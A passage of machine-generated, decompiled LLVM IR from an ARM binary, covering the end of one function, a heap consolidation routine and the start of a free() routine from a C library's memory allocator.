  %v3_166cc = load i32, i32* %v2_166cc, align 4
  %v1_166d0 = load i32, i32* @r6, align 4
  %v2_166d0 = sub i32 %v1_166d0, %v2_166c4
  store i32 %v2_166d0, i32* %r2.global-to-local, align 4
  %v1_166d4 = add i32 %v0_166cc, 44
  %v2_166d4 = inttoptr i32 %v1_166d4 to i32*
  %v3_166d4 = load i32, i32* %v2_166d4, align 4
  store i32 %v3_166d4, i32* %r1.global-to-local, align 4
  %v2_166d8 = sub i32 %v3_166cc, %v2_166c4
  %v1_166dc = or i32 %v2_166d0, 1
  store i32 %v1_166dc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_166d8, i32* %v2_166cc, align 4
  %v0_166e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_166e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_166e8 = add i32 %v1_166e8, 4
  %v3_166e8 = inttoptr i32 %v2_166e8 to i32*
  store i32 %v0_166e8, i32* %v3_166e8, align 4
  %v1_166fc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_166f4

dec_label_pc_166f0:                               ; preds = %dec_label_pc_16690, %dec_label_pc_166c4, %dec_label_pc_166ac, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_166f4

dec_label_pc_166f4:                               ; preds = %dec_label_pc_166cc, %dec_label_pc_166f0
  %v1_166fc = phi i32 [ %v1_166fc.pre, %dec_label_pc_166cc ], [ 0, %dec_label_pc_166f0 ]
  store i32 %v12_16654, i32* @r7, align 4
  ret i32 %v1_166fc

; uselistorder directives
  uselistorder i1 %v7_166bc, { 1, 0 }
  uselistorder i32 %v1_166b8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1665c, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_166f4, { 1, 0 }
  uselistorder label %dec_label_pc_166f0, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16700 = load i32, i32* @r4, align 4
  store i32 %v3_16700, i32* %stack_var_-36, align 4
  %v0_16704 = load i32, i32* @r0, align 4
  %v1_16704 = inttoptr i32 %v0_16704 to i32*
  %v2_16704 = load i32, i32* %v1_16704, align 4
  store i32 %v2_16704, i32* %r3.global-to-local, align 4
  %v2_16708 = icmp eq i32 %v2_16704, 0
  store i32 %v0_16704, i32* @r4, align 4
  br i1 %v2_16708, label %dec_label_pc_16840.preheader, label %dec_label_pc_1671c

dec_label_pc_16840.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1684825 = add i32 %v0_16704, 52
  store i32 %v1_1684825, i32* %r3.global-to-local, align 4
  %v2_1685026 = add i32 %v0_16704, 60
  %v3_1685027 = inttoptr i32 %v2_1685026 to i32*
  store i32 %v1_1684825, i32* %v3_1685027, align 4
  %v0_1685428 = load i32, i32* %r3.global-to-local, align 4
  %v2_1685429 = add i32 %v0_1685428, 12
  %v3_1685430 = inttoptr i32 %v2_1685429 to i32*
  store i32 %v0_1685428, i32* %v3_1685430, align 4
  br label %dec_label_pc_16840.dec_label_pc_16840_crit_edge

dec_label_pc_1671c:                               ; preds = %entry
  %v1_1671c = and i32 %v2_16704, -3
  %v3_16720 = udiv i32 %v2_16704, 8
  store i32 %v3_16720, i32* %r2.global-to-local, align 4
  store i32 %v1_1671c, i32* %v1_16704, align 4
  %v0_16728 = load i32, i32* @r0, align 4
  %v1_16728 = add i32 %v0_16728, -4
  store i32 %v1_16728, i32* %r3.global-to-local, align 4
  %v1_1672c = load i32, i32* %r2.global-to-local, align 4
  %v4_1672c = mul i32 %v1_1672c, 4
  %v5_1672c = add i32 %v4_1672c, %v1_16728
  store i32 %v5_1672c, i32* %sb.global-to-local, align 4
  %v1_16730 = add i32 %v0_16728, 52
  store i32 %v1_16730, i32* %r7.global-to-local, align 4
  %v1_16734 = add i32 %v0_16728, 4
  store i32 %v1_16734, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1673c

dec_label_pc_1673c:                               ; preds = %dec_label_pc_16838, %dec_label_pc_1671c
  %v1_1683010 = phi i32 [ %v1_16830, %dec_label_pc_16838 ], [ %v5_1672c, %dec_label_pc_1671c ]
  %v1_16748 = phi i32 [ %v1_16838, %dec_label_pc_16838 ], [ %v1_16734, %dec_label_pc_1671c ]
  %v1_1673c = inttoptr i32 %v1_16748 to i32*
  %v2_1673c = load i32, i32* %v1_1673c, align 4
  store i32 %v2_1673c, i32* %r1.global-to-local, align 4
  %v2_16740 = icmp eq i32 %v2_1673c, 0
  br i1 %v2_16740, label %dec_label_pc_16830, label %dec_label_pc_16748

dec_label_pc_16748:                               ; preds = %dec_label_pc_1673c
  %v0_16748 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16748, i32* %v1_1673c, align 4
  %v0_1674c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1674c

dec_label_pc_1674c:                               ; preds = %dec_label_pc_16824, %dec_label_pc_16748
  %v0_16768 = phi i32 [ %v0_16824, %dec_label_pc_16824 ], [ %v0_1674c.pre, %dec_label_pc_16748 ]
  %v1_1674c = add i32 %v0_16768, 4
  %v2_1674c = inttoptr i32 %v1_1674c to i32*
  %v3_1674c = load i32, i32* %v2_1674c, align 4
  store i32 %v3_1674c, i32* %r3.global-to-local, align 4
  %v1_16750 = and i32 %v3_1674c, -2
  store i32 %v1_16750, i32* %lr.global-to-local, align 4
  %v2_16754 = add i32 %v1_16750, %v0_16768
  store i32 %v2_16754, i32* @r0, align 4
  %v1_16758 = urem i32 %v3_1674c, 2
  %v2_16758 = icmp eq i32 %v1_16758, 0
  %v1_1675c = add i32 %v0_16768, 8
  %v2_1675c = inttoptr i32 %v1_1675c to i32*
  %v3_1675c = load i32, i32* %v2_1675c, align 4
  store i32 %v3_1675c, i32* %sl.global-to-local, align 4
  %v1_16760 = add i32 %v2_16754, 4
  %v2_16760 = inttoptr i32 %v1_16760 to i32*
  %v3_16760 = load i32, i32* %v2_16760, align 4
  store i32 %v3_16760, i32* %r8.global-to-local, align 4
  br i1 %v2_16758, label %dec_label_pc_16768, label %dec_label_pc_1679c

dec_label_pc_16768:                               ; preds = %dec_label_pc_1674c
  %v1_16768 = inttoptr i32 %v0_16768 to i32*
  %v2_16768 = load i32, i32* %v1_16768, align 4
  store i32 %v2_16768, i32* %r5.global-to-local, align 4
  %v2_1676c = sub i32 %v0_16768, %v2_16768
  store i32 %v2_1676c, i32* %r3.global-to-local, align 4
  %v1_16770 = add i32 %v2_1676c, 8
  %v2_16770 = inttoptr i32 %v1_16770 to i32*
  %v3_16770 = load i32, i32* %v2_16770, align 4
  store i32 %v3_16770, i32* %ip.global-to-local, align 4
  %v1_16774 = add i32 %v3_16770, 12
  %v2_16774 = inttoptr i32 %v1_16774 to i32*
  %v3_16774 = load i32, i32* %v2_16774, align 4
  store i32 %v3_16774, i32* %r1.global-to-local, align 4
  %v9_16778 = icmp eq i32 %v3_16774, %v2_1676c
  %v1_1677c = add i32 %v2_1676c, 12
  %v2_1677c = inttoptr i32 %v1_1677c to i32*
  %v3_1677c = load i32, i32* %v2_1677c, align 4
  store i32 %v3_1677c, i32* %r2.global-to-local, align 4
  br i1 %v9_16778, label %dec_label_pc_16784, label %dec_label_pc_167e0

dec_label_pc_16784:                               ; preds = %dec_label_pc_16768
  %v1_16784 = add i32 %v3_1677c, 8
  %v2_16784 = inttoptr i32 %v1_16784 to i32*
  %v3_16784 = load i32, i32* %v2_16784, align 4
  store i32 %v3_16784, i32* %r3.global-to-local, align 4
  %v9_16788 = icmp eq i32 %v3_16784, %v2_1676c
  br i1 %v9_16788, label %dec_label_pc_16790, label %dec_label_pc_167e0

dec_label_pc_16790:                               ; preds = %dec_label_pc_16784
  store i32 %v3_16770, i32* %v2_16784, align 4
  %v0_16794 = load i32, i32* %r2.global-to-local, align 4
  %v1_16794 = load i32, i32* %ip.global-to-local, align 4
  %v2_16794 = add i32 %v1_16794, 12
  %v3_16794 = inttoptr i32 %v2_16794 to i32*
  store i32 %v0_16794, i32* %v3_16794, align 4
  %v0_16798 = load i32, i32* %lr.global-to-local, align 4
  %v1_16798 = load i32, i32* %r5.global-to-local, align 4
  %v2_16798 = add i32 %v1_16798, %v0_16798
  store i32 %v2_16798, i32* %lr.global-to-local, align 4
  %v0_167a0.pre = load i32, i32* @r0, align 4
  %v0_167a4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1679c

dec_label_pc_1679c:                               ; preds = %dec_label_pc_1674c, %dec_label_pc_16790
  %v0_16814 = phi i32 [ %v1_16750, %dec_label_pc_1674c ], [ %v2_16798, %dec_label_pc_16790 ]
  %v0_167a4 = phi i32 [ %v3_16760, %dec_label_pc_1674c ], [ %v0_167a4.pre, %dec_label_pc_16790 ]
  %v1_167b8 = phi i32 [ %v2_16754, %dec_label_pc_1674c ], [ %v0_167a0.pre, %dec_label_pc_16790 ]
  %v0_1679c = load i32, i32* @r4, align 4
  %v1_1679c = add i32 %v0_1679c, 44
  %v2_1679c = inttoptr i32 %v1_1679c to i32*
  %v3_1679c = load i32, i32* %v2_1679c, align 4
  store i32 %v3_1679c, i32* %r3.global-to-local, align 4
  %v9_167a0 = icmp eq i32 %v1_167b8, %v3_1679c
  %v1_167a4 = and i32 %v0_167a4, -4
  store i32 %v1_167a4, i32* %r5.global-to-local, align 4
  br i1 %v9_167a0, label %dec_label_pc_16814, label %dec_label_pc_167ac

dec_label_pc_167ac:                               ; preds = %dec_label_pc_1679c
  %v2_167ac = add i32 %v1_167b8, %v1_167a4
  store i32 %v2_167ac, i32* %r3.global-to-local, align 4
  %v1_167b0 = add i32 %v2_167ac, 4
  %v2_167b0 = inttoptr i32 %v1_167b0 to i32*
  %v3_167b0 = load i32, i32* %v2_167b0, align 4
  store i32 %v3_167b0, i32* %r3.global-to-local, align 4
  %v1_167b4 = urem i32 %v3_167b0, 2
  %v2_167b4 = icmp eq i32 %v1_167b4, 0
  %v2_167b8 = add i32 %v1_167b8, 4
  %v3_167b8 = inttoptr i32 %v2_167b8 to i32*
  store i32 %v1_167a4, i32* %v3_167b8, align 4
  br i1 %v2_167b4, label %dec_label_pc_167c0, label %dec_label_pc_167ac.dec_label_pc_167f0_crit_edge

dec_label_pc_167ac.dec_label_pc_167f0_crit_edge:  ; preds = %dec_label_pc_167ac
  %v0_167f4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_167f0

dec_label_pc_167c0:                               ; preds = %dec_label_pc_167ac
  %v0_167c0 = load i32, i32* @r0, align 4
  %v1_167c0 = add i32 %v0_167c0, 8
  %v2_167c0 = inttoptr i32 %v1_167c0 to i32*
  %v3_167c0 = load i32, i32* %v2_167c0, align 4
  store i32 %v3_167c0, i32* %ip.global-to-local, align 4
  %v1_167c4 = add i32 %v3_167c0, 12
  %v2_167c4 = inttoptr i32 %v1_167c4 to i32*
  %v3_167c4 = load i32, i32* %v2_167c4, align 4
  store i32 %v3_167c4, i32* %r3.global-to-local, align 4
  %v9_167c8 = icmp eq i32 %v3_167c4, %v0_167c0
  %v1_167cc = add i32 %v0_167c0, 12
  %v2_167cc = inttoptr i32 %v1_167cc to i32*
  %v3_167cc = load i32, i32* %v2_167cc, align 4
  store i32 %v3_167cc, i32* %r2.global-to-local, align 4
  br i1 %v9_167c8, label %dec_label_pc_167d4, label %dec_label_pc_167e0

dec_label_pc_167d4:                               ; preds = %dec_label_pc_167c0
  %v1_167d4 = add i32 %v3_167cc, 8
  %v2_167d4 = inttoptr i32 %v1_167d4 to i32*
  %v3_167d4 = load i32, i32* %v2_167d4, align 4
  store i32 %v3_167d4, i32* %r3.global-to-local, align 4
  %v9_167d8 = icmp eq i32 %v3_167d4, %v0_167c0
  br i1 %v9_167d8, label %dec_label_pc_167e4, label %dec_label_pc_167e0

dec_label_pc_167e0:                               ; preds = %dec_label_pc_167c0, %dec_label_pc_16784, %dec_label_pc_16768, %dec_label_pc_167d4
  %v0_167e0 = call i32 @abort()
  store i32 %v0_167e0, i32* @r0, align 4
  %v0_167e4.pre = load i32, i32* @ip, align 4
  %v1_167e4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_167e4

dec_label_pc_167e4:                               ; preds = %dec_label_pc_167d4, %dec_label_pc_167e0
  %v1_167e4 = phi i32 [ %v3_167cc, %dec_label_pc_167d4 ], [ %v1_167e4.pre, %dec_label_pc_167e0 ]
  %v0_167e4 = phi i32 [ %v3_167c0, %dec_label_pc_167d4 ], [ %v0_167e4.pre, %dec_label_pc_167e0 ]
  %v2_167e4 = add i32 %v1_167e4, 8
  %v3_167e4 = inttoptr i32 %v2_167e4 to i32*
  store i32 %v0_167e4, i32* %v3_167e4, align 4
  %v0_167e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_167e8 = load i32, i32* %ip.global-to-local, align 4
  %v2_167e8 = add i32 %v1_167e8, 12
  %v3_167e8 = inttoptr i32 %v2_167e8 to i32*
  store i32 %v0_167e8, i32* %v3_167e8, align 4
  %v0_167ec = load i32, i32* %lr.global-to-local, align 4
  %v1_167ec = load i32, i32* %r5.global-to-local, align 4
  %v2_167ec = add i32 %v1_167ec, %v0_167ec
  store i32 %v2_167ec, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_167f0

dec_label_pc_167f0:                               ; preds = %dec_label_pc_167ac.dec_label_pc_167f0_crit_edge, %dec_label_pc_167e4
  %v0_167f4 = phi i32 [ %v0_167f4.pre, %dec_label_pc_167ac.dec_label_pc_167f0_crit_edge ], [ %v2_167ec, %dec_label_pc_167e4 ]
  %v0_167f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_167f0 = add i32 %v0_167f0, 8
  %v2_167f0 = inttoptr i32 %v1_167f0 to i32*
  %v3_167f0 = load i32, i32* %v2_167f0, align 4
  store i32 %v3_167f0, i32* %r2.global-to-local, align 4
  %v1_167f4 = or i32 %v0_167f4, 1
  store i32 %v1_167f4, i32* %r3.global-to-local, align 4
  %v0_167f8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_167f8, i32* %v2_167f0, align 4
  %v0_167fc = load i32, i32* %r1.global-to-local, align 4
  %v1_167fc = load i32, i32* %r2.global-to-local, align 4
  %v2_167fc = add i32 %v1_167fc, 12
  %v3_167fc = inttoptr i32 %v2_167fc to i32*
  store i32 %v0_167fc, i32* %v3_167fc, align 4
  %v0_16800 = load i32, i32* %lr.global-to-local, align 4
  %v1_16800 = load i32, i32* %r1.global-to-local, align 4
  %v3_16800 = add i32 %v1_16800, %v0_16800
  %v4_16800 = inttoptr i32 %v3_16800 to i32*
  store i32 %v0_16800, i32* %v4_16800, align 4
  %v0_16804 = load i32, i32* %r3.global-to-local, align 4
  %v1_16804 = load i32, i32* %r1.global-to-local, align 4
  %v2_16804 = add i32 %v1_16804, 4
  %v3_16804 = inttoptr i32 %v2_16804 to i32*
  store i32 %v0_16804, i32* %v3_16804, align 4
  %v0_16808 = load i32, i32* %r2.global-to-local, align 4
  %v1_16808 = load i32, i32* %r1.global-to-local, align 4
  %v2_16808 = add i32 %v1_16808, 8
  %v3_16808 = inttoptr i32 %v2_16808 to i32*
  store i32 %v0_16808, i32* %v3_16808, align 4
  %v0_1680c = load i32, i32* %r7.global-to-local, align 4
  %v1_1680c = load i32, i32* %r1.global-to-local, align 4
  %v2_1680c = add i32 %v1_1680c, 12
  %v3_1680c = inttoptr i32 %v2_1680c to i32*
  store i32 %v0_1680c, i32* %v3_1680c, align 4
  br label %dec_label_pc_16824

dec_label_pc_16814:                               ; preds = %dec_label_pc_1679c
  %v2_16814 = add i32 %v1_167a4, %v0_16814
  %v1_16818 = or i32 %v2_16814, 1
  store i32 %v1_16818, i32* %r3.global-to-local, align 4
  %v1_1681c = load i32, i32* %r1.global-to-local, align 4
  %v2_1681c = add i32 %v1_1681c, 4
  %v3_1681c = inttoptr i32 %v2_1681c to i32*
  store i32 %v1_16818, i32* %v3_1681c, align 4
  %v0_16820 = load i32, i32* %r1.global-to-local, align 4
  %v1_16820 = load i32, i32* @r4, align 4
  %v2_16820 = add i32 %v1_16820, 44
  %v3_16820 = inttoptr i32 %v2_16820 to i32*
  store i32 %v0_16820, i32* %v3_16820, align 4
  br label %dec_label_pc_16824

dec_label_pc_16824:                               ; preds = %dec_label_pc_167f0, %dec_label_pc_16814
  %v0_16824 = load i32, i32* %sl.global-to-local, align 4
  %v2_16824 = icmp eq i32 %v0_16824, 0
  store i32 %v0_16824, i32* %r1.global-to-local, align 4
  br i1 %v2_16824, label %dec_label_pc_16830.loopexit, label %dec_label_pc_1674c

dec_label_pc_16830.loopexit:                      ; preds = %dec_label_pc_16824
  %v0_16830.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_16830.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16830

dec_label_pc_16830:                               ; preds = %dec_label_pc_16830.loopexit, %dec_label_pc_1673c
  %v1_16830 = phi i32 [ %v1_16830.pre, %dec_label_pc_16830.loopexit ], [ %v1_1683010, %dec_label_pc_1673c ]
  %v0_16838 = phi i32 [ %v0_16830.pre, %dec_label_pc_16830.loopexit ], [ %v1_16748, %dec_label_pc_1673c ]
  %v9_16830 = icmp eq i32 %v0_16838, %v1_16830
  br i1 %v9_16830, label %dec_label_pc_168a8, label %dec_label_pc_16838

dec_label_pc_16838:                               ; preds = %dec_label_pc_16830
  %v1_16838 = add i32 %v0_16838, 4
  store i32 %v1_16838, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1673c

dec_label_pc_16840.dec_label_pc_16840_crit_edge:  ; preds = %dec_label_pc_16840.preheader, %dec_label_pc_16840.dec_label_pc_16840_crit_edge
  %v0_16840.pre = load i32, i32* @r4, align 4
  %v1_16840.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_16840 = mul i32 %v1_16840.pre, 8
  %v5_16840 = add i32 %v4_16840, %v0_16840.pre
  %v1_16844 = add i32 %v1_16840.pre, 1
  store i32 %v1_16844, i32* %r2.global-to-local, align 4
  %v1_16848 = add i32 %v5_16840, 44
  store i32 %v1_16848, i32* %r3.global-to-local, align 4
  %v2_16850 = add i32 %v5_16840, 52
  %v3_16850 = inttoptr i32 %v2_16850 to i32*
  store i32 %v1_16848, i32* %v3_16850, align 4
  %v0_16854 = load i32, i32* %r3.global-to-local, align 4
  %v2_16854 = add i32 %v0_16854, 12
  %v3_16854 = inttoptr i32 %v2_16854 to i32*
  store i32 %v0_16854, i32* %v3_16854, align 4
  %v7_16858 = icmp sgt i32 %v1_16844, 95
  br i1 %v7_16858, label %dec_label_pc_1685c, label %dec_label_pc_16840.dec_label_pc_16840_crit_edge

dec_label_pc_1685c:                               ; preds = %dec_label_pc_16840.dec_label_pc_16840_crit_edge
  %v0_1685c = load i32, i32* @r4, align 4
  %v1_1685c = inttoptr i32 %v0_1685c to i32*
  %v2_1685c = load i32, i32* %v1_1685c, align 4
  store i32 %v2_1685c, i32* %r2.global-to-local, align 4
  %v1_16860 = add i32 %v0_1685c, 864
  %v2_16860 = inttoptr i32 %v1_16860 to i32*
  %v3_16860 = load i32, i32* %v2_16860, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16868 = urem i32 %v2_1685c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_16870 = or i32 %v3_16860, 1
  store i32 %v1_16870, i32* %r1.global-to-local, align 4
  %v1_16874 = or i32 %v1_16868, 72
  store i32 %v1_16874, i32* %r2.global-to-local, align 4
  %v1_16878 = add i32 %v0_1685c, 52
  store i32 %v1_16878, i32* %ip.global-to-local, align 4
  %v2_1687c = add i32 %v0_1685c, 840
  %v3_1687c = inttoptr i32 %v2_1687c to i32*
  store i32 0, i32* %v3_1687c, align 4
  %v0_16880 = load i32, i32* %r3.global-to-local, align 4
  %v1_16880 = add i32 %v0_16880, 65536
  store i32 %v1_16880, i32* %r3.global-to-local, align 4
  %v0_16884 = load i32, i32* %r0.global-to-local, align 4
  %v1_16884 = load i32, i32* @r4, align 4
  %v2_16884 = add i32 %v1_16884, 836
  %v3_16884 = inttoptr i32 %v2_16884 to i32*
  store i32 %v0_16884, i32* %v3_16884, align 4
  %v0_16888 = load i32, i32* %r0.global-to-local, align 4
  %v1_16888 = load i32, i32* @r4, align 4
  %v2_16888 = add i32 %v1_16888, 844
  %v3_16888 = inttoptr i32 %v2_16888 to i32*
  store i32 %v0_16888, i32* %v3_16888, align 4
  %v1_1688c = load i32, i32* @r4, align 4
  %v2_1688c = add i32 %v1_1688c, 852
  %v3_1688c = inttoptr i32 %v2_1688c to i32*
  store i32 %v1_16880, i32* %v3_1688c, align 4
  %v1_16890 = load i32, i32* @r4, align 4
  %v2_16890 = add i32 %v1_16890, 864
  %v3_16890 = inttoptr i32 %v2_16890 to i32*
  store i32 %v1_16870, i32* %v3_16890, align 4
  %v1_16894 = load i32, i32* @r4, align 4
  %v2_16894 = inttoptr i32 %v1_16894 to i32*
  store i32 %v1_16874, i32* %v2_16894, align 4
  %v0_16898 = load i32, i32* %ip.global-to-local, align 4
  %v1_16898 = load i32, i32* @r4, align 4
  %v2_16898 = add i32 %v1_16898, 44
  %v3_16898 = inttoptr i32 %v2_16898 to i32*
  store i32 %v0_16898, i32* %v3_16898, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_168a0 = call i32 @sysconf(i32 30, i32 %v1_16870, i32 %v1_16874, i32 %v1_16880)
  store i32 %v4_168a0, i32* @r0, align 4
  %v1_168a4 = load i32, i32* @r4, align 4
  %v2_168a4 = add i32 %v1_168a4, 860
  %v3_168a4 = inttoptr i32 %v2_168a4 to i32*
  store i32 %v4_168a0, i32* %v3_168a4, align 4
  br label %dec_label_pc_168a8

dec_label_pc_168a8:                               ; preds = %dec_label_pc_16830, %dec_label_pc_1685c
  %v2_168ac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_168ac, i32* @r4, align 4
  %v1_168b0 = load i32, i32* @r0, align 4
  ret i32 %v1_168b0

; uselistorder directives
  uselistorder i32 %v0_1685c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16854, { 1, 0 }
  uselistorder i32 %v1_16838, { 1, 0 }
  uselistorder i32 %v0_16824, { 0, 2, 1 }
  uselistorder i32 %v0_16800, { 1, 0 }
  uselistorder i32 %v1_16750, { 1, 0, 2 }
  uselistorder i32 %v0_16768, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_16728, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 0, 6, 1, 2, 5, 3, 4 }
  uselistorder i32 852, { 1, 2, 0 }
  uselistorder label %dec_label_pc_168a8, { 1, 0 }
  uselistorder label %dec_label_pc_16840.dec_label_pc_16840_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16824, { 1, 0 }
  uselistorder label %dec_label_pc_167f0, { 1, 0 }
  uselistorder label %dec_label_pc_167e4, { 1, 0 }
  uselistorder label %dec_label_pc_167e0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1679c, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_168b4 = load i32, i32* @r4, align 4
  %v6_168b4 = load i32, i32* @r5, align 4
  %v9_168b4 = load i32, i32* @r6, align 4
  %v12_168b4 = load i32, i32* @r7, align 4
  %v18_168b4 = load i32, i32* @lr, align 4
  %v0_168bc = load i32, i32* @r0, align 4
  store i32 %v0_168bc, i32* @r6, align 4
  %v2_168bc = icmp eq i32 %v0_168bc, 0
  %v2_168c0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r7, align 4
  br i1 %v2_168bc, label %dec_label_pc_16ac8, label %dec_label_pc_168cc

dec_label_pc_168cc:                               ; preds = %entry
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_168d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 72) to i32*), align 4
  store i32 %v4_168d0, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_168d0, i32* %r2.global-to-local, align 4
  %v4_168dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 36) to i32*), align 4
  store i32 %v4_168dc, i32* %r1.global-to-local, align 4
  store i32 %v2_168c0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_168e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  store i32 %v4_168e8, i32* %ip.global-to-local, align 4
  store i32 92404, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_168e8)
  %v0_168f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_168f4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_168fc = load i32, i32* @r7, align 4
  %v2_168fc = add i32 %v0_168fc, 16
  %v3_168fc = inttoptr i32 %v2_168fc to i32*
  %v4_168fc = load i32, i32* %v3_168fc, align 4
  store i32 %v4_168fc, i32* %ip.global-to-local, align 4
  store i32 92424, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_168fc)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_1690c = load i32, i32* @r7, align 4
  %v2_1690c = add i32 %v0_1690c, 32
  %v3_1690c = inttoptr i32 %v2_1690c to i32*
  %v4_1690c = load i32, i32* %v3_1690c, align 4
  store i32 %v4_1690c, i32* @lr, align 4
  %v0_16910 = load i32, i32* @r6, align 4
  %v1_16910 = add i32 %v0_16910, -4
  %v2_16910 = inttoptr i32 %v1_16910 to i32*
  %v3_16910 = load i32, i32* %v2_16910, align 4
  store i32 %v3_16910, i32* %r2.global-to-local, align 4
  %v1_16914 = inttoptr i32 %v4_1690c to i32*
  %v2_16914 = load i32, i32* %v1_16914, align 4
  store i32 %v2_16914, i32* %r3.global-to-local, align 4
  %v1_16918 = and i32 %v3_16910, -4
  store i32 %v1_16918, i32* %ip.global-to-local, align 4
  %v1_1691c = add i32 %v0_16910, -8
  store i32 %v1_1691c, i32* @r5, align 4
  store i32 %v1_1691c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_16918, %v2_16914
  br i1 %tmp, label %dec_label_pc_1694c, label %dec_label_pc_1692c

dec_label_pc_1692c:                               ; preds = %dec_label_pc_168cc
  %v1_1692c = or i32 %v2_16914, 3
  store i32 %v1_1692c, i32* %r3.global-to-local, align 4
  store i32 %v1_1692c, i32* %v1_16914, align 4
  %v3_16930 = load i32, i32* @lr, align 4
  %v4_16930 = add i32 %v3_16930, -8
  store i32 %v4_16930, i32* %lr.global-to-local, align 4
  %v0_16934 = load i32, i32* %ip.global-to-local, align 4
  %v3_16934 = udiv i32 %v0_16934, 8
  store i32 %v3_16934, i32* %r1.global-to-local, align 4
  %v1_16938 = add i32 %v3_16930, -4
  store i32 %v1_16938, i32* %r2.global-to-local, align 4
  %v4_1693c = mul nuw i32 %v3_16934, 4
  %v5_1693c = add i32 %v4_1693c, %v1_16938
  %v6_1693c = inttoptr i32 %v5_1693c to i32*
  %v7_1693c = load i32, i32* %v6_1693c, align 4
  store i32 %v7_1693c, i32* %r3.global-to-local, align 4
  %v1_16940 = load i32, i32* @r5, align 4
  %v2_16940 = add i32 %v1_16940, 8
  %v3_16940 = inttoptr i32 %v2_16940 to i32*
  store i32 %v7_1693c, i32* %v3_16940, align 4
  %v0_16944 = load i32, i32* @r5, align 4
  %v1_16944 = load i32, i32* %r2.global-to-local, align 4
  %v2_16944 = load i32, i32* %r1.global-to-local, align 4
  %v5_16944 = mul i32 %v2_16944, 4
  %v6_16944 = add i32 %v5_16944, %v1_16944
